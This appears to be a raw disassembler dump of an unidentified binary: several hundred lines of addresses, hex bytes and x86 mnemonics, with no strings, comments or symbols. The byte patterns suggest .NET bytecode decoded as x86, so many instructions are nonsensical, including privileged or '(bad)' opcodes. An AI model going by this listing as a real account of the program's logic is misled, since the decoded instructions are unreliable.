  406437:	65 00 00             	add    %al,%gs:(%eax)
  40643a:	0a 6f fa             	or     -0x6(%edi),%ch
  40643d:	00 00                	add    %al,(%eax)
  40643f:	0a 11                	or     (%ecx),%dl
  406441:	0a 6f f8             	or     -0x8(%edi),%ch
  406444:	00 00                	add    %al,(%eax)
  406446:	0a 16                	or     (%esi),%dl
  406448:	6f                   	outsl  %ds:(%esi),(%dx)
  406449:	fb                   	sti
  40644a:	00 00                	add    %al,(%eax)
  40644c:	0a 11                	or     (%ecx),%dl
  40644e:	0a 6f f8             	or     -0x8(%edi),%ch
  406451:	00 00                	add    %al,(%eax)
  406453:	0a 17                	or     (%edi),%dl
  406455:	6f                   	outsl  %ds:(%esi),(%dx)
  406456:	fc                   	cld
  406457:	00 00                	add    %al,(%eax)
  406459:	0a 11                	or     (%ecx),%dl
  40645b:	0a 6f f8             	or     -0x8(%edi),%ch
  40645e:	00 00                	add    %al,(%eax)
  406460:	0a 17                	or     (%edi),%dl
  406462:	6f                   	outsl  %ds:(%esi),(%dx)
  406463:	fd                   	std
  406464:	00 00                	add    %al,(%eax)
  406466:	0a 11                	or     (%ecx),%dl
  406468:	0a 6f fe             	or     -0x2(%edi),%ch
  40646b:	00 00                	add    %al,(%eax)
  40646d:	0a 26                	or     (%esi),%ah
  40646f:	11 0a                	adc    %ecx,(%edx)
  406471:	6f                   	outsl  %ds:(%esi),(%dx)
  406472:	01 01                	add    %eax,(%ecx)
  406474:	00 0a                	add    %cl,(%edx)
  406476:	de 03                	fiadds (%ebx)
  406478:	26 de 00             	fiadds %es:(%eax)
  40647b:	07                   	pop    %es
  40647c:	6f                   	outsl  %ds:(%esi),(%dx)
  40647d:	d4 00                	aam    $0x0
  40647f:	00 0a                	add    %cl,(%edx)
  406481:	de 03                	fiadds (%ebx)
  406483:	26 de 00             	fiadds %es:(%eax)
  406486:	11 08                	adc    %ecx,(%eax)
  406488:	17                   	pop    %ss
  406489:	58                   	pop    %eax
  40648a:	13 08                	adc    (%eax),%ecx
  40648c:	11 08                	adc    %ecx,(%eax)
  40648e:	11 07                	adc    %eax,(%edi)
  406490:	8e 69 3f             	mov    0x3f(%ecx),%gs
  406493:	10 ff                	adc    %bh,%bh
  406495:	ff                   	(bad)
  406496:	ff                   	lcall  (bad)
  406497:	de 03                	fiadds (%ebx)
  406499:	26 de 00             	fiadds %es:(%eax)
  40649c:	72 b3                	jb     0x406451
  40649e:	06                   	push   %es
  40649f:	00 70 0a             	add    %dh,0xa(%eax)
  4064a2:	20 01                	and    %al,(%ecx)
  4064a4:	00 00                	add    %al,(%eax)
  4064a6:	80 20 00             	andb   $0x0,(%eax)
  4064a9:	01 00                	add    %eax,(%eax)
  4064ab:	00 28                	add    %ch,(%eax)
  4064ad:	07                   	pop    %es
  4064ae:	01 00                	add    %eax,(%eax)
  4064b0:	0a 06                	or     (%esi),%al
  4064b2:	17                   	pop    %ss
  4064b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4064b4:	08 01                	or     %al,(%ecx)
  4064b6:	00 0a                	add    %cl,(%edx)
  4064b8:	13 0b                	adc    (%ebx),%ecx
  4064ba:	11 0b                	adc    %ecx,(%ebx)
  4064bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4064bd:	09 01                	or     %eax,(%ecx)
  4064bf:	00 0a                	add    %cl,(%edx)
  4064c1:	13 07                	adc    (%edi),%eax
  4064c3:	16                   	push   %ss
  4064c4:	13 08                	adc    (%eax),%ecx
  4064c6:	2b 45 11             	sub    0x11(%ebp),%eax
  4064c9:	07                   	pop    %es
  4064ca:	11 08                	adc    %ecx,(%eax)
  4064cc:	9a 13 0c 11 0b 11 0c 	lcall  $0xc11,$0xb110c13
  4064d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4064d4:	0a 01                	or     (%ecx),%al
  4064d6:	00 0a                	add    %cl,(%edx)
  4064d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4064d9:	59                   	pop    %ecx
  4064da:	00 00                	add    %al,(%eax)
  4064dc:	0a 72 57             	or     0x57(%edx),%dh
  4064df:	06                   	push   %es
  4064e0:	00 70 72             	add    %dh,0x72(%eax)
  4064e3:	ed                   	in     (%dx),%eax
  4064e4:	04 00                	add    $0x0,%al
  4064e6:	70 6f                	jo     0x406557
  4064e8:	03 01                	add    (%ecx),%eax
  4064ea:	00 0a                	add    %cl,(%edx)
  4064ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4064ed:	06                   	push   %es
  4064ee:	01 00                	add    %eax,(%eax)
  4064f0:	0a 02                	or     (%edx),%al
  4064f2:	7b aa                	jnp    0x40649e
  4064f4:	00 00                	add    %al,(%eax)
  4064f6:	04 28                	add    $0x28,%al
  4064f8:	21 00                	and    %eax,(%eax)
  4064fa:	00 0a                	add    %cl,(%edx)
  4064fc:	2c 09                	sub    $0x9,%al
  4064fe:	11 0b                	adc    %ecx,(%ebx)
  406500:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  406503:	0b 01                	or     (%ecx),%eax
  406505:	00 0a                	add    %cl,(%edx)
  406507:	11 08                	adc    %ecx,(%eax)
  406509:	17                   	pop    %ss
  40650a:	58                   	pop    %eax
  40650b:	13 08                	adc    (%eax),%ecx
  40650d:	11 08                	adc    %ecx,(%eax)
  40650f:	11 07                	adc    %eax,(%edi)
  406511:	8e 69 32             	mov    0x32(%ecx),%gs
  406514:	b3 de                	mov    $0xde,%bl
  406516:	0c 11                	or     $0x11,%al
  406518:	0b 2c 07             	or     (%edi,%eax,1),%ebp
  40651b:	11 0b                	adc    %ecx,(%ebx)
  40651d:	6f                   	outsl  %ds:(%esi),(%dx)
  40651e:	4b                   	dec    %ebx
  40651f:	00 00                	add    %al,(%eax)
  406521:	0a dc                	or     %ah,%bl
  406523:	de 03                	fiadds (%ebx)
  406525:	26 de 00             	fiadds %es:(%eax)
  406528:	2a 00                	sub    (%eax),%al
  40652a:	00 00                	add    %al,(%eax)
  40652c:	41                   	inc    %ecx
  40652d:	94                   	xchg   %eax,%esp
  40652e:	00 00                	add    %al,(%eax)
  406530:	00 00                	add    %al,(%eax)
  406532:	00 00                	add    %al,(%eax)
  406534:	67 00 00             	add    %al,(%bx,%si)
  406537:	00 08                	add    %cl,(%eax)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 6f 00             	add    %ch,0x0(%edi)
  40653e:	00 00                	add    %al,(%eax)
  406540:	03 00                	add    (%eax),%eax
  406542:	00 00                	add    %al,(%eax)
  406544:	01 00                	add    %eax,(%eax)
  406546:	00 01                	add    %al,(%ecx)
  406548:	00 00                	add    %al,(%eax)
  40654a:	00 00                	add    %al,(%eax)
  40654c:	ab                   	stos   %eax,%es:(%edi)
  40654d:	01 00                	add    %eax,(%eax)
  40654f:	00 09                	add    %cl,(%ecx)
  406551:	00 00                	add    %al,(%eax)
  406553:	00 b4 01 00 00 03 00 	add    %dh,0x30000(%ecx,%eax,1)
  40655a:	00 00                	add    %al,(%eax)
  40655c:	01 00                	add    %eax,(%eax)
  40655e:	00 01                	add    %al,(%ecx)
  406560:	00 00                	add    %al,(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	44                   	inc    %esp
  406565:	01 00                	add    %eax,(%eax)
  406567:	00 7b 00             	add    %bh,0x0(%ebx)
  40656a:	00 00                	add    %al,(%eax)
  40656c:	bf 01 00 00 03       	mov    $0x3000001,%edi
  406571:	00 00                	add    %al,(%eax)
  406573:	00 01                	add    %al,(%ecx)
  406575:	00 00                	add    %al,(%eax)
  406577:	01 00                	add    %eax,(%eax)
  406579:	00 00                	add    %al,(%eax)
  40657b:	00 0a                	add    %cl,(%edx)
  40657d:	00 00                	add    %al,(%eax)
  40657f:	00 cb                	add    %cl,%bl
  406581:	01 00                	add    %eax,(%eax)
  406583:	00 d5                	add    %dl,%ch
  406585:	01 00                	add    %eax,(%eax)
  406587:	00 03                	add    %al,(%ebx)
  406589:	00 00                	add    %al,(%eax)
  40658b:	00 01                	add    %al,(%ecx)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	01 02                	add    %eax,(%edx)
  406591:	00 00                	add    %al,(%eax)
  406593:	00 f6                	add    %dh,%dh
  406595:	01 00                	add    %eax,(%eax)
  406597:	00 5d 00             	add    %bl,0x0(%ebp)
  40659a:	00 00                	add    %al,(%eax)
  40659c:	53                   	push   %ebx
  40659d:	02 00                	add    (%eax),%al
  40659f:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	de 01                	fiadds (%ecx)
  4065ae:	00 00                	add    %al,(%eax)
  4065b0:	83 00 00             	addl   $0x0,(%eax)
  4065b3:	00 61 02             	add    %ah,0x2(%ecx)
  4065b6:	00 00                	add    %al,(%eax)
  4065b8:	03 00                	add    (%eax),%eax
  4065ba:	00 00                	add    %al,(%eax)
  4065bc:	01 00                	add    %eax,(%eax)
  4065be:	00 01                	add    %al,(%ecx)
  4065c0:	1b 30                	sbb    (%eax),%esi
  4065c2:	05 00 55 00 00       	add    $0x5500,%eax
  4065c7:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4065ca:	00 11                	add    %dl,(%ecx)
  4065cc:	72 b3                	jb     0x406581
  4065ce:	06                   	push   %es
  4065cf:	00 70 0a             	add    %dh,0xa(%eax)
  4065d2:	20 01                	and    %al,(%ecx)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	80 20 00             	andb   $0x0,(%eax)
  4065d9:	01 00                	add    %eax,(%eax)
  4065db:	00 28                	add    %ch,(%eax)
  4065dd:	07                   	pop    %es
  4065de:	01 00                	add    %eax,(%eax)
  4065e0:	0a 06                	or     (%esi),%al
  4065e2:	17                   	pop    %ss
  4065e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4065e4:	08 01                	or     %al,(%ecx)
  4065e6:	00 0a                	add    %cl,(%edx)
  4065e8:	0b 07                	or     (%edi),%eax
  4065ea:	02 7b ab             	add    -0x55(%ebx),%bh
  4065ed:	00 00                	add    %al,(%eax)
  4065ef:	04 72                	add    $0x72,%al
  4065f1:	57                   	push   %edi
  4065f2:	06                   	push   %es
  4065f3:	00 70 02             	add    %dh,0x2(%eax)
  4065f6:	7b ac                	jnp    0x4065a4
  4065f8:	00 00                	add    %al,(%eax)
  4065fa:	04 72                	add    $0x72,%al
  4065fc:	57                   	push   %edi
  4065fd:	06                   	push   %es
  4065fe:	00 70 28             	add    %dh,0x28(%eax)
  406601:	65 00 00             	add    %al,%gs:(%eax)
  406604:	0a 6f 0c             	or     0xc(%edi),%ch
  406607:	01 00                	add    %eax,(%eax)
  406609:	0a de                	or     %dh,%bl
  40660b:	0a 07                	or     (%edi),%al
  40660d:	2c 06                	sub    $0x6,%al
  40660f:	07                   	pop    %es
  406610:	6f                   	outsl  %ds:(%esi),(%dx)
  406611:	4b                   	dec    %ebx
  406612:	00 00                	add    %al,(%eax)
  406614:	0a dc                	or     %ah,%bl
  406616:	17                   	pop    %ss
  406617:	0c de                	or     $0xde,%al
  406619:	05 26 16 0c de       	add    $0xde0c1626,%eax
  40661e:	00 08                	add    %cl,(%eax)
  406620:	2a 00                	sub    (%eax),%al
  406622:	00 00                	add    %al,(%eax)
  406624:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  406627:	00 02                	add    %al,(%edx)
  406629:	00 1d 00 23 40 00    	add    %bl,0x402300
  40662f:	0a 00                	or     (%eax),%al
  406631:	00 00                	add    %al,(%eax)
  406633:	00 00                	add    %al,(%eax)
  406635:	00 06                	add    %al,(%esi)
  406637:	00 48 4e             	add    %cl,0x4e(%eax)
  40663a:	00 05 01 00 00 01    	add    %al,0x1000001
  406640:	1b 30                	sbb    (%eax),%esi
  406642:	05 00 b0 01 00       	add    $0x1b000,%eax
  406647:	00 3d 00 00 11 02    	add    %bh,0x2110000
  40664d:	7b ad                	jnp    0x4065fc
  40664f:	00 00                	add    %al,(%eax)
  406651:	04 0a                	add    $0xa,%al
  406653:	06                   	push   %es
  406654:	26 00 06             	add    %al,%es:(%esi)
  406657:	39 0d 01 00 00 72    	cmp    %ecx,0x72000001
  40665d:	0f 07                	sysret
  40665f:	00 70 02             	add    %dh,0x2(%eax)
  406662:	7b af                	jnp    0x406613
  406664:	00 00                	add    %al,(%eax)
  406666:	04 72                	add    $0x72,%al
  406668:	16                   	push   %ss
  406669:	0e                   	push   %cs
  40666a:	00 70 28             	add    %dh,0x28(%eax)
  40666d:	65 00 00             	add    %al,%gs:(%eax)
  406670:	0a 0c 02             	or     (%edx,%eax,1),%cl
  406673:	28 0d 01 00 0a 7d    	sub    %cl,0x7d0a0001
  406679:	b1 00                	mov    $0x0,%cl
  40667b:	00 04 02             	add    %al,(%edx,%eax,1)
  40667e:	7b b1                	jnp    0x406631
  406680:	00 00                	add    %al,(%eax)
  406682:	04 08                	add    $0x8,%al
  406684:	28 0e                	sub    %cl,(%esi)
  406686:	01 00                	add    %eax,(%eax)
  406688:	0a 02                	or     (%edx),%al
  40668a:	73 f7                	jae    0x406683
  40668c:	00 00                	add    %al,(%eax)
  40668e:	0a 7d b2             	or     -0x4e(%ebp),%bh
  406691:	00 00                	add    %al,(%eax)
  406693:	04 02                	add    $0x2,%al
  406695:	7b b2                	jnp    0x406649
  406697:	00 00                	add    %al,(%eax)
  406699:	04 6f                	add    $0x6f,%al
  40669b:	f8                   	clc
  40669c:	00 00                	add    %al,(%eax)
  40669e:	0a 72 19             	or     0x19(%edx),%dh
  4066a1:	06                   	push   %es
  4066a2:	00 70 6f             	add    %dh,0x6f(%eax)
  4066a5:	f9                   	stc
  4066a6:	00 00                	add    %al,(%eax)
  4066a8:	0a 02                	or     (%edx),%al
  4066aa:	7b b2                	jnp    0x40665e
  4066ac:	00 00                	add    %al,(%eax)
  4066ae:	04 6f                	add    $0x6f,%al
  4066b0:	f8                   	clc
  4066b1:	00 00                	add    %al,(%eax)
  4066b3:	0a 1b                	or     (%ebx),%bl
  4066b5:	8d 34 00             	lea    (%eax,%eax,1),%esi
  4066b8:	00 01                	add    %al,(%ecx)
  4066ba:	25 16 72 cf 0e       	and    $0xecf7216,%eax
  4066bf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4066c2:	25 17 02 7b b0       	and    $0xb07b0217,%eax
  4066c7:	00 00                	add    %al,(%eax)
  4066c9:	04 a2                	add    $0xa2,%al
  4066cb:	25 18 72 eb 0e       	and    $0xeeb7218,%eax
  4066d0:	00 70 a2             	add    %dh,-0x5e(%eax)
  4066d3:	25 19 02 7b b1       	and    $0xb17b0219,%eax
  4066d8:	00 00                	add    %al,(%eax)
  4066da:	04 a2                	add    $0xa2,%al
  4066dc:	25 1a 72 fd 0e       	and    $0xefd721a,%eax
  4066e1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4066e4:	28 0f                	sub    %cl,(%edi)
  4066e6:	01 00                	add    %eax,(%eax)
  4066e8:	0a 6f fa             	or     -0x6(%edi),%ch
  4066eb:	00 00                	add    %al,(%eax)
  4066ed:	0a 02                	or     (%edx),%al
  4066ef:	7b b2                	jnp    0x4066a3
  4066f1:	00 00                	add    %al,(%eax)
  4066f3:	04 6f                	add    $0x6f,%al
  4066f5:	f8                   	clc
  4066f6:	00 00                	add    %al,(%eax)
  4066f8:	0a 16                	or     (%esi),%dl
  4066fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4066fb:	fb                   	sti
  4066fc:	00 00                	add    %al,(%eax)
  4066fe:	0a 02                	or     (%edx),%al
  406700:	7b b2                	jnp    0x4066b4
  406702:	00 00                	add    %al,(%eax)
  406704:	04 6f                	add    $0x6f,%al
  406706:	f8                   	clc
  406707:	00 00                	add    %al,(%eax)
  406709:	0a 17                	or     (%edi),%dl
  40670b:	6f                   	outsl  %ds:(%esi),(%dx)
  40670c:	fc                   	cld
  40670d:	00 00                	add    %al,(%eax)
  40670f:	0a 02                	or     (%edx),%al
  406711:	7b b2                	jnp    0x4066c5
  406713:	00 00                	add    %al,(%eax)
  406715:	04 6f                	add    $0x6f,%al
  406717:	f8                   	clc
  406718:	00 00                	add    %al,(%eax)
  40671a:	0a 17                	or     (%edi),%dl
  40671c:	6f                   	outsl  %ds:(%esi),(%dx)
  40671d:	fd                   	std
  40671e:	00 00                	add    %al,(%eax)
  406720:	0a 02                	or     (%edx),%al
  406722:	7b b2                	jnp    0x4066d6
  406724:	00 00                	add    %al,(%eax)
  406726:	04 6f                	add    $0x6f,%al
  406728:	fe 00                	incb   (%eax)
  40672a:	00 0a                	add    %cl,(%edx)
  40672c:	26 20 b8 0b 00 00 28 	and    %bh,%es:0x2800000b(%eax)
  406733:	6b 00 00             	imul   $0x0,(%eax),%eax
  406736:	0a 6f 37             	or     0x37(%edi),%ch
  406739:	00 00                	add    %al,(%eax)
  40673b:	0a 0d 12 03 28 38    	or     0x38280312,%cl
  406741:	00 00                	add    %al,(%eax)
  406743:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  406749:	0a 7d ad             	or     -0x53(%ebp),%bh
  40674c:	00 00                	add    %al,(%eax)
  40674e:	04 02                	add    $0x2,%al
  406750:	09 7d b3             	or     %edi,-0x4d(%ebp)
  406753:	00 00                	add    %al,(%eax)
  406755:	04 02                	add    $0x2,%al
  406757:	7c ae                	jl     0x406707
  406759:	00 00                	add    %al,(%eax)
  40675b:	04 12                	add    $0x12,%al
  40675d:	03 02                	add    (%edx),%eax
  40675f:	28 46 00             	sub    %al,0x0(%esi)
  406762:	00 2b                	add    %ch,(%ebx)
  406764:	dd 92 00 00 00 02    	fstl   0x2000000(%edx)
  40676a:	7b b3                	jnp    0x40671f
  40676c:	00 00                	add    %al,(%eax)
  40676e:	04 0d                	add    $0xd,%al
  406770:	02 7c b3 00          	add    0x0(%ebx,%esi,4),%bh
  406774:	00 04 fe             	add    %al,(%esi,%edi,8)
  406777:	15 0a 00 00 01       	adc    $0x100000a,%eax
  40677c:	02 15 25 0a 7d ad    	add    0xad7d0a25,%dl
  406782:	00 00                	add    %al,(%eax)
  406784:	04 12                	add    $0x12,%al
  406786:	03 28                	add    (%eax),%ebp
  406788:	39 00                	cmp    %eax,(%eax)
  40678a:	00 0a                	add    %cl,(%edx)
  40678c:	02 7b b2             	add    -0x4e(%ebx),%bh
  40678f:	00 00                	add    %al,(%eax)
  406791:	04 6f                	add    $0x6f,%al
  406793:	ff 00                	incl   (%eax)
  406795:	00 0a                	add    %cl,(%edx)
  406797:	6f                   	outsl  %ds:(%esi),(%dx)
  406798:	00 01                	add    %al,(%ecx)
  40679a:	00 0a                	add    %cl,(%edx)
  40679c:	02 7b b1             	add    -0x4f(%ebx),%bh
  40679f:	00 00                	add    %al,(%eax)
  4067a1:	04 28                	add    $0x28,%al
  4067a3:	10 01                	adc    %al,(%ecx)
  4067a5:	00 0a                	add    %cl,(%edx)
  4067a7:	72 07                	jb     0x4067b0
  4067a9:	0f 00                	(bad)
  4067ab:	70 6f                	jo     0x40681c
  4067ad:	11 01                	adc    %eax,(%ecx)
  4067af:	00 0a                	add    %cl,(%edx)
  4067b1:	2c 04                	sub    $0x4,%al
  4067b3:	17                   	pop    %ss
  4067b4:	0b de                	or     %esi,%ebx
  4067b6:	30 02                	xor    %al,(%edx)
  4067b8:	14 7d                	adc    $0x7d,%al
  4067ba:	b1 00                	mov    $0x0,%cl
  4067bc:	00 04 02             	add    %al,(%edx,%eax,1)
  4067bf:	14 7d                	adc    $0x7d,%al
  4067c1:	b2 00                	mov    $0x0,%dl
  4067c3:	00 04 de             	add    %al,(%esi,%ebx,8)
  4067c6:	03 26                	add    (%esi),%esp
  4067c8:	de 00                	fiadds (%eax)
  4067ca:	16                   	push   %ss
  4067cb:	0b de                	or     %esi,%ebx
  4067cd:	19 13                	sbb    %edx,(%ebx)
  4067cf:	04 02                	add    $0x2,%al
  4067d1:	1f                   	pop    %ds
  4067d2:	fe                   	(bad)
  4067d3:	7d ad                	jge    0x406782
  4067d5:	00 00                	add    %al,(%eax)
  4067d7:	04 02                	add    $0x2,%al
  4067d9:	7c ae                	jl     0x406789
  4067db:	00 00                	add    %al,(%eax)
  4067dd:	04 11                	add    $0x11,%al
  4067df:	04 28                	add    $0x28,%al
  4067e1:	7c 00                	jl     0x4067e3
  4067e3:	00 0a                	add    %cl,(%edx)
  4067e5:	de 14 02             	ficoms (%edx,%eax,1)
  4067e8:	1f                   	pop    %ds
  4067e9:	fe                   	(bad)
  4067ea:	7d ad                	jge    0x406799
  4067ec:	00 00                	add    %al,(%eax)
  4067ee:	04 02                	add    $0x2,%al
  4067f0:	7c ae                	jl     0x4067a0
  4067f2:	00 00                	add    %al,(%eax)
  4067f4:	04 07                	add    $0x7,%al
  4067f6:	28 7d 00             	sub    %bh,0x0(%ebp)
  4067f9:	00 0a                	add    %cl,(%edx)
  4067fb:	2a 41 34             	sub    0x34(%ecx),%al
  4067fe:	00 00                	add    %al,(%eax)
  406800:	00 00                	add    %al,(%eax)
  406802:	00 00                	add    %al,(%eax)
  406804:	0a 00                	or     (%eax),%al
  406806:	00 00                	add    %al,(%eax)
  406808:	71 01                	jno    0x40680b
  40680a:	00 00                	add    %al,(%eax)
  40680c:	7b 01                	jnp    0x40680f
  40680e:	00 00                	add    %al,(%eax)
  406810:	03 00                	add    (%eax),%eax
  406812:	00 00                	add    %al,(%eax)
  406814:	01 00                	add    %eax,(%eax)
  406816:	00 01                	add    %al,(%ecx)
  406818:	00 00                	add    %al,(%eax)
  40681a:	00 00                	add    %al,(%eax)
  40681c:	07                   	pop    %es
  40681d:	00 00                	add    %al,(%eax)
  40681f:	00 7b 01             	add    %bh,0x1(%ebx)
  406822:	00 00                	add    %al,(%eax)
  406824:	82 01 00             	addb   $0x0,(%ecx)
  406827:	00 19                	add    %bl,(%ecx)
  406829:	00 00                	add    %al,(%eax)
  40682b:	00 0b                	add    %cl,(%ebx)
  40682d:	00 00                	add    %al,(%eax)
  40682f:	01 1b                	add    %ebx,(%ebx)
  406831:	30 03                	xor    %al,(%ebx)
  406833:	00 b8 00 00 00 3e    	add    %bh,0x3e000000(%eax)
  406839:	00 00                	add    %al,(%eax)
  40683b:	11 02                	adc    %eax,(%edx)
  40683d:	7b b4                	jnp    0x4067f3
  40683f:	00 00                	add    %al,(%eax)
  406841:	04 0a                	add    $0xa,%al
  406843:	06                   	push   %es
  406844:	2c 5c                	sub    $0x5c,%al
  406846:	73 83                	jae    0x4067cb
  406848:	00 00                	add    %al,(%eax)
  40684a:	06                   	push   %es
  40684b:	25 02 7b b6 00       	and    $0xb67b02,%eax
  406850:	00 04 7d ab 00 00 04 	add    %al,0x40000ab(,%edi,2)
  406857:	25 02 7b b7 00       	and    $0xb77b02,%eax
  40685c:	00 04 7d ac 00 00 04 	add    %al,0x40000ac(,%edi,2)
  406863:	fe 06                	incb   (%esi)
  406865:	84 00                	test   %al,(%eax)
  406867:	00 06                	add    %al,(%esi)
  406869:	73 12                	jae    0x40687d
  40686b:	01 00                	add    %eax,(%eax)
  40686d:	0a 28                	or     (%eax),%ch
  40686f:	47                   	inc    %edi
  406870:	00 00                	add    %al,(%eax)
  406872:	2b 6f 2b             	sub    0x2b(%edi),%ebp
  406875:	00 00                	add    %al,(%eax)
  406877:	0a 0c 12             	or     (%edx,%edx,1),%cl
  40687a:	02 28                	add    (%eax),%ch
  40687c:	2c 00                	sub    $0x0,%al
  40687e:	00 0a                	add    %cl,(%edx)
  406880:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  406885:	0a 7d b4             	or     -0x4c(%ebp),%bh
  406888:	00 00                	add    %al,(%eax)
  40688a:	04 02                	add    $0x2,%al
  40688c:	08 7d b8             	or     %bh,-0x48(%ebp)
  40688f:	00 00                	add    %al,(%eax)
  406891:	04 02                	add    $0x2,%al
  406893:	7c b5                	jl     0x40684a
  406895:	00 00                	add    %al,(%eax)
  406897:	04 12                	add    $0x12,%al
  406899:	02 02                	add    (%edx),%al
  40689b:	28 48 00             	sub    %cl,0x0(%eax)
  40689e:	00 2b                	add    %ch,(%ebx)
  4068a0:	de 51 02             	ficoms 0x2(%ecx)
  4068a3:	7b b8                	jnp    0x40685d
  4068a5:	00 00                	add    %al,(%eax)
  4068a7:	04 0c                	add    $0xc,%al
  4068a9:	02 7c b8 00          	add    0x0(%eax,%edi,4),%bh
  4068ad:	00 04 fe             	add    %al,(%esi,%edi,8)
  4068b0:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  4068b5:	02 15 25 0a 7d b4    	add    0xb47d0a25,%dl
  4068bb:	00 00                	add    %al,(%eax)
  4068bd:	04 12                	add    $0x12,%al
  4068bf:	02 28                	add    (%eax),%ch
  4068c1:	2d 00 00 0a 0b       	sub    $0xb0a0000,%eax
  4068c6:	de 17                	ficoms (%edi)
  4068c8:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  4068cd:	b4 00                	mov    $0x0,%ah
  4068cf:	00 04 02             	add    %al,(%edx,%eax,1)
  4068d2:	7c b5                	jl     0x406889
  4068d4:	00 00                	add    %al,(%eax)
  4068d6:	04 09                	add    $0x9,%al
  4068d8:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  4068dc:	0a de                	or     %dh,%bl
  4068de:	14 02                	adc    $0x2,%al
  4068e0:	1f                   	pop    %ds
  4068e1:	fe                   	(bad)
  4068e2:	7d b4                	jge    0x406898
  4068e4:	00 00                	add    %al,(%eax)
  4068e6:	04 02                	add    $0x2,%al
  4068e8:	7c b5                	jl     0x40689f
  4068ea:	00 00                	add    %al,(%eax)
  4068ec:	04 07                	add    $0x7,%al
  4068ee:	28 7d 00             	sub    %bh,0x0(%ebp)
  4068f1:	00 0a                	add    %cl,(%edx)
  4068f3:	2a 01                	sub    (%ecx),%al
  4068f5:	10 00                	adc    %al,(%eax)
  4068f7:	00 00                	add    %al,(%eax)
  4068f9:	00 07                	add    %al,(%edi)
  4068fb:	00 85 8c 00 17 0b    	add    %al,0xb17008c(%ebp)
  406901:	00 00                	add    %al,(%eax)
  406903:	01 1b                	add    %ebx,(%ebx)
  406905:	30 03                	xor    %al,(%ebx)
  406907:	00 e8                	add    %ch,%al
  406909:	00 00                	add    %al,(%eax)
  40690b:	00 3f                	add    %bh,(%edi)
  40690d:	00 00                	add    %al,(%eax)
  40690f:	11 02                	adc    %eax,(%edx)
  406911:	7b b9                	jnp    0x4068cc
  406913:	00 00                	add    %al,(%eax)
  406915:	04 0a                	add    $0xa,%al
  406917:	06                   	push   %es
  406918:	26 00 06             	add    %al,%es:(%esi)
  40691b:	2c 68                	sub    $0x68,%al
  40691d:	02 02                	add    (%edx),%al
  40691f:	7b bb                	jnp    0x4068dc
  406921:	00 00                	add    %al,(%eax)
  406923:	04 02                	add    $0x2,%al
  406925:	7b bc                	jnp    0x4068e3
  406927:	00 00                	add    %al,(%eax)
  406929:	04 73                	add    $0x73,%al
  40692b:	42                   	inc    %edx
  40692c:	00 00                	add    %al,(%eax)
  40692e:	06                   	push   %es
  40692f:	02 7b bd             	add    -0x43(%ebx),%bh
  406932:	00 00                	add    %al,(%eax)
  406934:	04 73                	add    $0x73,%al
  406936:	2c 00                	sub    $0x0,%al
  406938:	00 06                	add    %al,(%esi)
  40693a:	7d c0                	jge    0x4068fc
  40693c:	00 00                	add    %al,(%eax)
  40693e:	04 02                	add    $0x2,%al
  406940:	7b c0                	jnp    0x406902
  406942:	00 00                	add    %al,(%eax)
  406944:	04 02                	add    $0x2,%al
  406946:	7b be                	jnp    0x406906
  406948:	00 00                	add    %al,(%eax)
  40694a:	04 02                	add    $0x2,%al
  40694c:	7b bf                	jnp    0x40690d
  40694e:	00 00                	add    %al,(%eax)
  406950:	04 6f                	add    $0x6f,%al
  406952:	36 00 00             	add    %al,%ss:(%eax)
  406955:	06                   	push   %es
  406956:	6f                   	outsl  %ds:(%esi),(%dx)
  406957:	2b 00                	sub    (%eax),%eax
  406959:	00 0a                	add    %cl,(%edx)
  40695b:	0c 12                	or     $0x12,%al
  40695d:	02 28                	add    (%eax),%ch
  40695f:	2c 00                	sub    $0x0,%al
  406961:	00 0a                	add    %cl,(%edx)
  406963:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  406968:	0a 7d b9             	or     -0x47(%ebp),%bh
  40696b:	00 00                	add    %al,(%eax)
  40696d:	04 02                	add    $0x2,%al
  40696f:	08 7d c1             	or     %bh,-0x3f(%ebp)
  406972:	00 00                	add    %al,(%eax)
  406974:	04 02                	add    $0x2,%al
  406976:	7c ba                	jl     0x406932
  406978:	00 00                	add    %al,(%eax)
  40697a:	04 12                	add    $0x12,%al
  40697c:	02 02                	add    (%edx),%al
  40697e:	28 49 00             	sub    %cl,0x0(%ecx)
  406981:	00 2b                	add    %ch,(%ebx)
  406983:	de 72 02             	fidivs 0x2(%edx)
  406986:	7b c1                	jnp    0x406949
  406988:	00 00                	add    %al,(%eax)
  40698a:	04 0c                	add    $0xc,%al
  40698c:	02 7c c1 00          	add    0x0(%ecx,%eax,8),%bh
  406990:	00 04 fe             	add    %al,(%esi,%edi,8)
  406993:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  406998:	02 15 25 0a 7d b9    	add    0xb97d0a25,%dl
  40699e:	00 00                	add    %al,(%eax)
  4069a0:	04 12                	add    $0x12,%al
  4069a2:	02 28                	add    (%eax),%ch
  4069a4:	2d 00 00 0a 2d       	sub    $0x2d0a0000,%eax
  4069a9:	04 14                	add    $0x14,%al
  4069ab:	0b de                	or     %esi,%ebx
  4069ad:	2e de 05 26 14 0b de 	fiadds %cs:0xde0b1426
  4069b4:	27                   	daa
  4069b5:	02 7b c0             	add    -0x40(%ebx),%bh
  4069b8:	00 00                	add    %al,(%eax)
  4069ba:	04 0b                	add    $0xb,%al
  4069bc:	de 1e                	ficomps (%esi)
